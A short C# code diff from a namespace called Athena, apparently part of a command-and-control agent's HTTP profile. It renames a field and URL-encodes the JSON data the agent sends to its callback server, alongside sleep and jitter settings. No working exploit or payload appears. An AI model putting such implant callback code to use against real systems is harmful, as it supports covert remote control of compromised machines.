@@ -23,7 +23,7 @@ namespace Athena
             this.sleep = sleep;
             int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.currentConfig = new HTTP();
+            this.profile = new HTTP();
         }
     }
     public class HTTP : IProfile
@@ -120,7 +120,7 @@ namespace Athena
 
                 if (json.Length < 2000) //Max URL length
                 {
-                    response = await this.client.GetAsync(this.getURL + json);
+                    response = await this.client.GetAsync(this.getURL + WebUtility.UrlEncode(json));
                 }
                 else
                 {
